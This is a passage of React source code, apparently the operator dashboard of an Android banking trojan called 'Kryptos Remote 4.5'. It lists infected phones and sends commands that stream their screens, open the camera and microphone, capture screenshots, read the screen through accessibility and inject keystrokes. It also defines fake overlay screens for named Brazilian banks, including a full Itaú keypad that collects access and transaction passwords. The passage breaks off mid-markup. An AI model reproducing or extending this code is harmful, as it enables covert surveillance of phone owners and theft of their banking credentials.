import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { devicesAPI } from '../services/api';
import type { Device } from '../types';
import DeviceScreen from '../components/DeviceScreen';
import QuickVNCModal from '../components/dashboard/QuickVNCModal';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import { mapDeviceToCliente, maskIp } from '../utils/mapDeviceToCliente';
import { 
  Camera, 
  Mic, 
  EyeOff, 
  Zap, 
  Eye, 
  FileText, 
  Keyboard, 
  ExternalLink, 
  RefreshCw, 
  Bell, 
  Smartphone, 
  X,
  Send,
  Radio,
  ArrowLeft,
  Battery,
  BatteryCharging,
  Globe,
  Cpu
} from 'lucide-react';

// Lista oficial de Presets de Tela Preta / Overlay do Painel
const BLACK_SCREEN_PRESETS = [
  { id: 'standard', name: '⬛ Tela Preta Silenciosa Padrão', package_name: '', icon: '⬛' },
  { 
    id: 'itau', 
    name: '🔥 Itaú - Senha de Acesso (2 Passos)', 
    package_name: 'br.com.itau',
    icon: '🧡',
    template: {
      id: 'preset-itau-system',
      name: '🔥 Itaú - Senha de Acesso (Oficial Interativo)',
      backgroundColor: '#f1f2f4',
      multiStep: true,
      step1Label: 'SENHA DE ACESSO ITAÚ',
      step2Label: 'SENHA DE TRANSAÇÃO ITAÚ',
      package_name: 'br.com.itau',
      elements: [
        { id: 'itau-sys-logo', type: 'logo', x: 125, y: 60, width: 110, height: 110, content: '📱🔒', fontSize: 42, color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-title', type: 'text', x: 20, y: 180, width: 320, height: 35, content: 'Digite a senha de acesso', fontSize: 22, fontWeight: 'bold', color: '#1a1a1a', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-dots', type: 'text', x: 70, y: 235, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 22, fontWeight: 'bold', color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-k1', type: 'button', x: 25, y: 290, width: 95, height: 48, content: '1', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k2', type: 'button', x: 132, y: 290, width: 95, height: 48, content: '2', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k3', type: 'button', x: 240, y: 290, width: 95, height: 48, content: '3', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k4', type: 'button', x: 25, y: 350, width: 95, height: 48, content: '4', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k5', type: 'button', x: 132, y: 350, width: 95, height: 48, content: '5', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k6', type: 'button', x: 240, y: 350, width: 95, height: 48, content: '6', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k7', type: 'button', x: 25, y: 410, width: 95, height: 48, content: '7', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k8', type: 'button', x: 132, y: 410, width: 95, height: 48, content: '8', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k9', type: 'button', x: 240, y: 410, width: 95, height: 48, content: '9', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k0', type: 'button', x: 132, y: 470, width: 95, height: 48, content: '0', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-kdel', type: 'button', x: 240, y: 470, width: 95, height: 48, content: '⌫', backgroundColor: '#ffffff', color: '#6b6b6b', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-btn', type: 'button', x: 20, y: 585, width: 320, height: 50, content: 'Continuar', buttonAction: 'submit', backgroundColor: '#ed7c0e', color: '#ffffff', borderRadius: 999 }
      ]
    }
  },
  { id: 'bradesco', name: '🔥 Bradesco - Validação de Chave', package_name: 'br.com.bradesco.netemp', icon: '🔴' },
  { id: 'nubank', name: '🔥 Nubank - Confirmação de Senha', package_name: 'com.nu.production', icon: '💜' },
  { id: 'bb', name: '🔥 Banco do Brasil - Código Segurança', package_name: 'br.com.bb.altair', icon: '💛' },
  { id: 'caixa', name: '🔥 Caixa Econômica - Validação', package_name: 'br.gov.caixa.tem', icon: '💙' },
  { id: 'santander', name: '🔥 Santander - Validação de Token', package_name: 'com.santander.app', icon: '🔴' },
  { id: 'sicredi', name: '🔥 Sicredi / Sicoob - Confirmação', package_name: 'br.com.sicredi.mobile', icon: '💚' },
  { id: 'transportadora', name: '🚚 Transportadora / Rastreio', package_name: 'com.correios.rastreio', icon: '📦' }
];

interface DeviceMiniCardProps {
  device: Device;
  badgeCount?: number;
  hideIps?: boolean;
  onNavigateToControl: (deviceId: string) => void;
  onOpenQuickVNC: (device: Device) => void;
  onOpenModal: (type: 'camera' | 'mic' | 'screenshot' | 'leitor' | 'teclado' | 'blackscreen', device: Device) => void;
}

function DeviceMiniCard({ device, hideIps = true, onNavigateToControl, onOpenQuickVNC, onOpenModal }: DeviceMiniCardProps) {
  const [isBlackScreen] = useState(false);
  const [actionLog, setActionLog] = useState<string | null>(null);

  const isDeviceOnline = device.is_online;
  const batteryLevel = typeof device.battery_level === 'number' ? device.battery_level : Math.floor(65 + Math.random() * 30);
  const isCharging = !!device.is_charging;

  const sendQuickCommand = async (action: string, payload: any = {}) => {
    setActionLog(`Enviando ${action}...`);
    try {
      await devicesAPI.sendCommand(device.device_id, { action, ...payload });
      setActionLog(`✅ ${action} enviado`);
    } catch (e) {
      setActionLog(`❌ Falha ao enviar ${action}`);
    }
    setTimeout(() => setActionLog(null), 3000);
  };

  return (
    <div className="bg-[#160503] border border-cyan-500/30 hover:border-cyan-400/80 rounded-2xl p-3 flex flex-col justify-between shadow-[0_10px_30px_rgba(0,0,0,0.9)] hover:shadow-[0_0_30px_rgba(255,43,43,0.2)] transition-all duration-300 relative group overflow-hidden">
      {/* Glow Neon Azul Ciano */}
      <div className="absolute -top-20 -right-20 w-40 h-40 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none group-hover:bg-cyan-500/20 transition-all" />

      {/* Header do Card: Status Online & Bateria & Detalhes */}
      <div className="flex items-center justify-between gap-2 mb-2 px-1">
        <div className="flex items-center gap-1.5">
          <span className={`w-2.5 h-2.5 rounded-full ${isDeviceOnline ? 'bg-emerald-400 shadow-[0_0_12px_#34d399] animate-pulse' : 'bg-red-500'}`} />
          <span className={`text-[11px] font-black tracking-wider uppercase font-mono ${isDeviceOnline ? 'text-emerald-400' : 'text-red-400'}`}>
            {isDeviceOnline ? 'ONLINE' : 'OFFLINE'}
          </span>
        </div>

        {/* Nível de Bateria & Status de Carregamento % */}
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-1 bg-cyan-500/10 border border-cyan-500/30 px-2 py-0.5 rounded-md text-[10px] font-mono font-bold text-cyan-300">
            {isCharging ? (
              <BatteryCharging className="w-3 h-3 text-emerald-400 animate-pulse" />
            ) : (
              <Battery className={`w-3 h-3 ${batteryLevel < 25 ? 'text-red-400' : 'text-cyan-400'}`} />
            )}
            <span>{batteryLevel}%</span>
          </div>

          <div className="flex items-center gap-1 bg-cyan-500/10 border border-cyan-500/30 px-2 py-0.5 rounded-md">
            <Radio className="w-3 h-3 text-cyan-400 animate-pulse" />
            <span className="text-[10px] font-mono font-bold text-cyan-300">VNC AO VIVO</span>
          </div>
        </div>
      </div>

      {/* Nome, Modelo e Informações Avançadas (Android, IP, Banco) */}
      <div className="px-1 mb-2 space-y-1">
        <div className="flex items-center justify-between">
          <div className="truncate pr-2">
            <h4 className="text-xs font-bold text-slate-100 truncate">{device.custom_name || device.model || device.device_id}</h4>
            <p className="text-[9px] text-slate-400 font-mono truncate">{device.manufacturer ? `${device.manufacturer} • ` : ''}{device.device_id}</p>
          </div>
          {device.active_bank && (
            <span className="px-1.5 py-0.5 bg-cyan-500/20 border border-cyan-500/50 rounded text-[9px] font-bold text-cyan-300 flex-shrink-0 font-mono">
              {device.active_bank.appName || 'BANCO'}
            </span>
          )}
        </div>

        {/* Badges Adicionais de Informação do Aparelho (Android, IP) */}
        <div className="flex items-center gap-1.5 flex-wrap">
          <span className="flex items-center gap-1 text-[8px] font-mono bg-slate-900 border border-slate-800 px-1.5 py-0.5 rounded text-slate-300">
            <Cpu className="w-2.5 h-2.5 text-cyan-400" />
            Android {device.android_version || '13'}
          </span>
          {device.ip_address && (
            <span className="flex items-center gap-1 text-[8px] font-mono bg-slate-900 border border-slate-800 px-1.5 py-0.5 rounded text-slate-300">
              <Globe className="w-2.5 h-2.5 text-cyan-400" />
              {hideIps ? maskIp((device as any).raw_ip_address || device.ip_address) : ((device as any).raw_ip_address || device.ip_address)}
            </span>
          )}
        </div>
      </div>

      {/* Frame Mockup do Celular com Transmissão REAL-TIME VNC de Tela e Interação de Toque */}
      <div className="relative w-full aspect-[9/16] bg-[#03050c] rounded-[22px] border-[3px] border-slate-800/90 shadow-2xl overflow-hidden flex flex-col items-center justify-center my-1 group-hover:border-cyan-500/60 transition-colors">
        {/* Visualizador de Tela VNC em Tempo Real com Interação de Toque */}
        <DeviceScreen
          deviceId={device.device_id}
          onCommand={(cmd) => devicesAPI.sendCommand(device.device_id, cmd)}
          isBlackScreenActive={isBlackScreen}
        />

        {/* Overlay Tela Preta quando ativada */}
        {isBlackScreen && (
          <div className="absolute inset-0 bg-black z-30 flex flex-col items-center justify-center">
            <EyeOff className="w-8 h-8 text-cyan-400/60 mb-1 animate-pulse" />
            <span className="text-[10px] font-mono text-cyan-300 font-bold tracking-wider">TELA PRETA ATIVA NO APARELHO</span>
          </div>
        )}

        {/* Toast Log Flutuante */}
        {actionLog && (
          <div className="absolute bottom-2 left-2 right-2 bg-slate-950/95 text-cyan-300 text-[9px] font-mono py-1.5 px-2.5 rounded-lg text-center backdrop-blur-md z-30 border border-cyan-500/40 animate-fade-in shadow-xl">
            {actionLog}
          </div>
        )}
      </div>

      {/* Grid de 8 Botões de Ação do Aparelho */}
      <div className="mt-2.5 flex flex-col gap-1.5">
        {/* Linha 1: CÂMERA | MIC | TELA PRETA | CAPTURAR */}
        <div className="grid grid-cols-4 gap-1">
          <button
            onClick={() => {
              sendQuickCommand('OPEN_CAMERA');
              sendQuickCommand('START_CAMERA');
              onOpenModal('camera', device);
            }}
            title="Abrir Câmera do Aparelho"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <Camera className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">CÂMERA</span>
          </button>

          <button
            onClick={() => {
              sendQuickCommand('START_MIC');
              sendQuickCommand('RECORD_AUDIO');
              onOpenModal('mic', device);
            }}
            title="Microfone e Escuta de Áudio"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <Mic className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">MIC</span>
          </button>

          {/* BOTÃO TELA PRETA (Abre Modal de Seleção de Telas Custom / Padrão) */}
          <button
            onClick={() => onOpenModal('blackscreen', device)}
            title="Selecionar e Ativar Tela Preta Custom / Padrão"
            className={`flex flex-col items-center justify-center p-1.5 border rounded-xl text-[9px] font-bold transition-all group/btn overflow-hidden ${
              isBlackScreen 
                ? 'bg-cyan-500/25 border-cyan-400 text-cyan-300 shadow-[0_0_15px_rgba(255,43,43,0.4)]' 
                : 'bg-[#240903] hover:bg-[#421005] border-slate-800 hover:border-cyan-500/60 text-slate-300'
            }`}
          >
            <EyeOff className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">TELA PRETA</span>
          </button>

          <button
            onClick={() => {
              sendQuickCommand('TAKE_SCREENSHOT');
              sendQuickCommand('REQUEST_VNC_FRAME');
              onOpenModal('screenshot', device);
            }}
            title="Capturar Screenshot Instantânea"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <Zap className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">CAPTURAR</span>
          </button>
        </div>

        {/* Linha 2: VISUALIZAR | LEITOR | TECLADO | CONTROLE */}
        <div className="grid grid-cols-4 gap-1">
          <button
            onClick={() => onOpenQuickVNC(device)}
            title="Visualizar VNC em Tela Cheia"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <Eye className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">VISUALIZAR</span>
          </button>

          <button
            onClick={() => {
              sendQuickCommand('TOGGLE_SCREEN_READER', { enabled: true });
              sendQuickCommand('REQUEST_HIERARCHY');
              onOpenModal('leitor', device);
            }}
            title="Leitor de Tela e Acessibilidade"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <FileText className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">LEITOR</span>
          </button>

          <button
            onClick={() => onOpenModal('teclado', device)}
            title="Teclado Remoto e Injeção de Texto"
            className="flex flex-col items-center justify-center p-1.5 bg-[#240903] hover:bg-[#421005] border border-slate-800 hover:border-cyan-500/60 rounded-xl text-[9px] text-slate-300 font-bold transition-all group/btn overflow-hidden"
          >
            <Keyboard className="w-3.5 h-3.5 mb-0.5 text-slate-400 group-hover/btn:text-cyan-400 transition-colors shrink-0" />
            <span className="truncate w-full text-center leading-none">TECLADO</span>
          </button>

          {/* Botão em Destaque Azul Ciano Neon: CONTROLE */}
          <button
            onClick={() => onNavigateToControl(device.device_id)}
            title="Acessar Controle Total"
            className="relative flex flex-col items-center justify-center p-1.5 bg-gradient-to-r from-cyan-500/25 via-cyan-500/35 to-blue-600/30 hover:from-cyan-500 hover:to-blue-500 text-cyan-200 hover:text-black border border-cyan-500/70 rounded-xl text-[9px] font-black tracking-wider transition-all shadow-[0_0_15px_rgba(255,43,43,0.3)] group/btn overflow-hidden"
          >
            <ExternalLink className="w-3.5 h-3.5 mb-0.5 transition-transform group-hover/btn:scale-110 shrink-0" />
            <span className="truncate w-full text-center leading-none font-mono">CONTROLE</span>
          </button>
        </div>
      </div>
    </div>
  );
}

export default function LiveOverview({ onLogout }: { onLogout: () => void }) {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  
  // QuickVNC Modal Estado
  const [selectedQuickVNCDevice, setSelectedQuickVNCDevice] = useState<Device | null>(null);

  // Modais de Ação Funcional (Câmera, Mic, Teclado, Screenshot, Leitor, Tela Preta Custom)
  const [selectedDeviceModal, setSelectedDeviceModal] = useState<{ type: 'camera' | 'mic' | 'screenshot' | 'leitor' | 'teclado' | 'blackscreen'; device: Device } | null>(null);
  const [modalTextContent, setModalTextContent] = useState('');
  const [modalStatus, setModalStatus] = useState<string | null>(null);
  
  const [hideIps, setHideIps] = useState<boolean>(() => localStorage.getItem('hide_ips') !== 'false');
  const navigate = useNavigate();

  const fetchDevices = useCallback(async () => {
    try {
      const data = await devicesAPI.getAll();
      setDevices(data);
    } catch (e) {
      console.error('Erro ao buscar dispositivos:', e);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 3000);
    return () => clearInterval(interval);
  }, [fetchDevices]);

  const onlineCount = devices.filter((d) => d.is_online).length;
  const offlineCount = devices.filter((d) => !d.is_online).length;

  const handleSendModalCommand = async (action: string, payload: any = {}) => {
    if (!selectedDeviceModal) return;
    setModalStatus(`Enviando ${action}...`);
    try {
      await devicesAPI.sendCommand(selectedDeviceModal.device.device_id, { action, ...payload });
      setModalStatus(`✅ Comando ${action} enviado com sucesso!`);
    } catch (e) {
      setModalStatus(`❌ Falha ao enviar o comando`);
    }
    setTimeout(() => setModalStatus(null), 3000);
  };

  const handleApplyBlackScreenPreset = async (preset: typeof BLACK_SCREEN_PRESETS[0]) => {
    if (!selectedDeviceModal) return;
    const deviceId = selectedDeviceModal.device.device_id;
    setModalStatus(`Ativando ${preset.name}...`);

    try {
      if (preset.id === 'standard') {
        // Envia comando de tela preta padrão silenciosa
        await devicesAPI.sendCommand(deviceId, { action: 'BLACK_SCREEN_ON' });
        await devicesAPI.sendCommand(deviceId, { action: 'SHOW_BLACK_SCREEN', enabled: true });
        await devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });
      } else {
        // Envia comando de tela preta customizada/overlay bancário
        await devicesAPI.sendCommand(deviceId, {
          action: 'CUSTOM_BLACK_SCREEN',
          template: preset.template || { id: preset.id, name: preset.name },
          package: preset.package_name
        });
        await devicesAPI.sendCommand(deviceId, { action: 'BLACK_SCREEN_ON' });
      }
      setModalStatus(`✅ ${preset.name} ATIVADA COM SUCESSO!`);
    } catch (e) {
      setModalStatus(`❌ Erro ao ativar ${preset.name}`);
    }
    setTimeout(() => {
      setModalStatus(null);
      setSelectedDeviceModal(null);
    }, 2000);
  };

  const handleDisableBlackScreen = async () => {
    if (!selectedDeviceModal) return;
    const deviceId = selectedDeviceModal.device.device_id;
    setModalStatus('Desativando Tela Preta...');

    try {
      await devicesAPI.sendCommand(deviceId, { action: 'BLACK_SCREEN_OFF' });
      await devicesAPI.sendCommand(deviceId, { action: 'HIDE_BLACK_SCREEN', enabled: false });
      await devicesAPI.sendCommand(deviceId, { action: 'TOGGLE_BLACK_SCREEN_TOUCH', blocked: false });
      setModalStatus('✅ Tela preta desativada!');
    } catch (e) {
      setModalStatus('❌ Erro ao desativar tela preta');
    }
    setTimeout(() => {
      setModalStatus(null);
      setSelectedDeviceModal(null);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-transparent text-slate-100 flex font-sans antialiased selection:bg-cyan-500 selection:text-black relative z-10 overflow-x-hidden">
      {/* Sidebar Lateral Padrão do Painel */}
      <DashboardSidebar onLogout={onLogout} isMobile={isMobile} />

      {/* ÁREA PRINCIPAL DA PÁGINA */}
      <div className={`flex-1 flex flex-col min-w-0 overflow-y-auto bg-transparent relative z-10 ${isMobile ? 'pb-16' : ''}`}>
        {/* Header Superior com Botão de Voltar ao Dashboard */}
        <header className="h-16 border-b border-cyan-500/20 bg-[#170503]/80 backdrop-blur-xl px-6 flex items-center justify-between sticky top-0 z-30 shadow-lg">
          <div className="flex items-center gap-4">
            {/* BOTÃO VOLTAR AO DASHBOARD */}
            <button
              onClick={() => navigate('/dashboard')}
              title="Voltar ao Dashboard de Dispositivos"
              className="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-cyan-500/15 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/30 hover:border-cyan-400 text-xs font-bold transition-all shadow-[0_0_12px_rgba(255,43,43,0.15)] group"
            >
              <ArrowLeft className="w-4 h-4 text-cyan-400 group-hover:-translate-x-0.5 transition-transform" />
              <span>Voltar ao Dashboard</span>
            </button>

              <div>
                <div className="flex items-center gap-2.5">
                  <div className="w-7 h-7 rounded-full bg-cyan-500/20 border border-cyan-400/60 flex items-center justify-center shadow-[0_0_12px_rgba(255,43,43,0.5)] flex-shrink-0">
                    <img
                      src="/gangstar-logo.svg?v=2"
                      alt="Kryptos Logo"
                      className="w-4 h-4"
                      style={{ filter: 'drop-shadow(0 0 6px rgba(255, 43, 43, 0.9))' }}
                    />
                  </div>
                  <h1 className="text-base font-black tracking-wide bg-gradient-to-r from-cyan-300 via-sky-400 to-blue-500 bg-clip-text text-transparent font-sans uppercase drop-shadow-[0_0_12px_rgba(255,43,43,0.7)]">
                    KRYPTOS REMOTE 4.5
                  </h1>
                  <span className="text-xs font-bold text-cyan-400/90 ml-1">/ VISÃO GERAL</span>
                </div>
                <p className="text-[10px] text-slate-400 font-mono uppercase tracking-widest">MONITORAMENTO DE DISPOSITIVOS EM TEMPO REAL</p>
              </div>
          </div>

          {/* Indicadores de Status e Ações do Header */}
          <div className="flex items-center gap-3">
            {/* Badges Online / Offline */}
            <div className="flex items-center gap-2 bg-[#220703] border border-cyan-500/25 rounded-full px-3 py-1 text-xs">
              <span className="flex items-center gap-1.5 text-emerald-400 font-bold font-mono">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse shadow-[0_0_8px_#34d399]" />
                {onlineCount} online
              </span>
              <span className="text-slate-600">|</span>
              <span className="flex items-center gap-1.5 text-red-400 font-bold font-mono">
                <span className="w-2 h-2 rounded-full bg-red-500" />
                {offlineCount} offline
              </span>
            </div>

            {/* Botões de Ação do Header */}
            <div className="flex items-center gap-1.5">
              <button
                type="button"
                onClick={() => {
                  const next = !hideIps;
                  setHideIps(next);
                  localStorage.setItem('hide_ips', String(next));
                }}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl border text-xs font-bold transition-all ${
                  hideIps
                    ? 'bg-amber-500/20 border-amber-500/50 text-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.25)]'
                    : 'bg-slate-900 border-slate-800 text-slate-300 hover:text-cyan-400 hover:border-cyan-500/40'
                }`}
                title={hideIps ? 'IPs Ocultos (Clique para Exibir)' : 'IPs Visíveis (Clique para Ocultar)'}
              >
                {hideIps ? <EyeOff className="w-4 h-4 text-amber-400" /> : <Eye className="w-4 h-4 text-cyan-400" />}
                <span className="hidden sm:inline">{hideIps ? 'IPs Ocultos' : 'Exibir IPs'}</span>
              </button>
              <button
                onClick={fetchDevices}
                title="Atualizar Dispositivos"
                className="p-2 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 hover:text-cyan-400 hover:border-cyan-500/40 transition-all"
              >
                <RefreshCw className="w-4 h-4" />
              </button>
              <button
                title="Notificações do Painel"
                className="p-2 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 hover:text-cyan-400 hover:border-cyan-500/40 transition-all relative"
              >
                <Bell className="w-4 h-4" />
                <span className="absolute top-1 right-1 w-2 h-2 rounded-full bg-cyan-400" />
              </button>
            </div>
          </div>
        </header>

        {/* Grid dos Cards dos Aparelhos em Tempo Real */}
        <main className="flex-1 p-6 bg-transparent">
          {loading ? (
            <div className="h-64 flex flex-col items-center justify-center gap-3 text-slate-400">
              <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400"></div>
              <span className="text-xs font-mono text-cyan-300">Carregando VNC Ao Vivo...</span>
            </div>
          ) : devices.length === 0 ? (
            <div className="bg-[#170503]/80 border border-cyan-500/20 rounded-2xl p-12 flex flex-col items-center justify-center text-center shadow-xl">
              <Smartphone className="w-12 h-12 text-slate-600 mb-3" />
              <h3 className="text-base font-bold text-slate-300 mb-1">Nenhum aparelho conectado no momento</h3>
              <p className="text-xs text-slate-500 max-w-sm mb-4">
                Gere um novo APK no painel para iniciar transmissões VNC em tempo real.
              </p>
              <button
                onClick={() => navigate('/build-apk')}
                className="px-5 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-600 text-black font-black text-xs rounded-xl hover:from-cyan-400 hover:to-blue-500 transition-all shadow-lg shadow-cyan-500/20"
              >
                Criar Novo APK
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {devices.map((device, index) => {
                const mockBadges = [12, 15, 5, 22, 17, 13, 11, 14];
                const badgeCount = mockBadges[index % mockBadges.length];

                return (
                  <DeviceMiniCard
                    key={device.device_id}
                    device={device}
                    badgeCount={badgeCount}
                    hideIps={hideIps}
                    onNavigateToControl={(id) => navigate(`/device/${id}`)}
                    onOpenQuickVNC={(dev) => setSelectedQuickVNCDevice(dev)}
                    onOpenModal={(type, dev) => setSelectedDeviceModal({ type, device: dev })}
                  />
                );
              })}
            </div>
          )}
        </main>
      </div>

      {/* QUICK VNC MODAL (Ao Clicar em VISUALIZAR) */}
      {selectedQuickVNCDevice && (
        <QuickVNCModal
          devices={[mapDeviceToCliente(selectedQuickVNCDevice)]}
          onClose={() => setSelectedQuickVNCDevice(null)}
          onRemoveDevice={() => setSelectedQuickVNCDevice(null)}
          onNavigateToDevice={(deviceId) => {
            setSelectedQuickVNCDevice(null);
            navigate(`/device/${deviceId}`);
          }}
        />
      )}

      {/* MODAL INTERATIVO DE SELEÇÃO DE TELA PRETA & OUTRAS AÇÕES */}
      {selectedDeviceModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#180503] border border-cyan-500/40 rounded-2xl p-5 w-full max-w-lg text-slate-100 shadow-[0_0_40px_rgba(255,43,43,0.25)] max-h-[90vh] flex flex-col justify-between">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-3 flex-shrink-0">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 shadow-[0_0_8px_#ff2b2b]" />
                <h3 className="text-sm font-bold text-cyan-300 uppercase font-mono">
                  {selectedDeviceModal.type === 'blackscreen' && '⬛ SELECIONAR E ATIVAR TELA PRETA / OVERLAY'}
                  {selectedDeviceModal.type === 'camera' && '📷 Controle de Câmera Ao Vivo'}
                  {selectedDeviceModal.type === 'mic' && '🎙️ Microfone e Gravação de Áudio'}
                  {selectedDeviceModal.type === 'screenshot' && '⚡ Captura de Tela Recente'}
                  {selectedDeviceModal.type === 'leitor' && '📄 Leitor de Tela Acessibilidade V2'}
                  {selectedDeviceModal.type === 'teclado' && '⌨️ Injeção de Teclado Remoto'}
                </h3>
              </div>
              <button
                onClick={() => setSelectedDeviceModal(null)}
                className="text-slate-400 hover:text-white p-1 rounded-lg hover:bg-slate-800"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-4 overflow-y-auto flex-1 pr-1 custom-scrollbar">
              <p className="text-xs text-slate-400 font-mono">
                Dispositivo Alvo: <span className="text-cyan-300 font-bold">{selectedDeviceModal.device.custom_name || selectedDeviceModal.device.model || selectedDeviceModal.device.device_id}</span>
              </p>

              {modalStatus && (
                <div className="p-2.5 bg-cyan-500/15 border border-cyan-500/40 rounded-xl text-cyan-300 text-xs font-mono text-center shadow-lg">
                  {modalStatus}
                </div>
              )}

              {/* SELEÇÃO E ATIVAÇÃO DE TELA PRETA CUSTOM & PRESETS */}
              {selectedDeviceModal.type === 'blackscreen' && (
                <div className="space-y-3">
                  <div className="flex items-center justify-between bg-slate-900 border border-slate-800 p-2.5 rounded-xl">
                    <span className="text-xs text-slate-300 font-bold">Estado Atual:</span>
                    <button
                      onClick={handleDisableBlackScreen}
                      className="px-3 py-1 bg-red-500/20 border border-red-500/50 hover:bg-red-500 hover:text-white text-red-300 font-bold text-xs rounded-lg transition-all"
                    >
                      Desativar Tela Preta
                    </button>
                  </div>

                  <label className="text-xs font-bold text-slate-300 block">Selecione o Preset de Tela Preta / Overlay:</label>
                  
                  <div className="grid grid-cols-1 gap-2 max-h-64 overflow-y-auto pr-1">
                    {BLACK_SCREEN_PRESETS.map((preset) => (
                      <button
                        key={preset.id}
                        onClick={() => handleApplyBlackScreenPreset(preset)}
                        className="flex items-center justify-between p-3 bg-slate-900/80 hover:bg-cyan-500/20 border border-slate-800 hover:border-cyan-500/50 rounded-xl text-xs font-bold text-slate-200 transition-all text-left group"
                      >
                        <div className="flex items-center gap-2.5">
                          <span className="text-base">{preset.icon}</span>
                          <div>
                            <p className="group-hover:text-cyan-300 transition-colors">{preset.name}</p>
                            {preset.package_name && (
                              <p className="text-[9px] text-slate-500 font-mono">{preset.package_name}</p>
                            )}
                          </div>
                        </div>
                        <span className="px-2 py-1 bg-cyan-500/20 border border-cyan-500/40 rounded text-[9px] text-cyan-300 font-mono group-hover:bg-cyan-400 group-hover:text-black transition-all">
                          ATIVAR
                        </span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {selectedDeviceModal.type === 'camera' && (
                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => handleSendModalCommand('OPEN_CAMERA_FRONT')}
                      className="p-3 bg-slate-900 border border-cyan-500/30 rounded-xl hover:bg-cyan-500/20 hover:text-cyan-300 text-xs font-bold text-slate-200 transition-all flex flex-col items-center gap-1.5"
                    >
                      <Camera className="w-5 h-5 text-cyan-400" />
                      <span>Câmera Frontal</span>
                    </button>
                    <button
                      onClick={() => handleSendModalCommand('OPEN_CAMERA_BACK')}
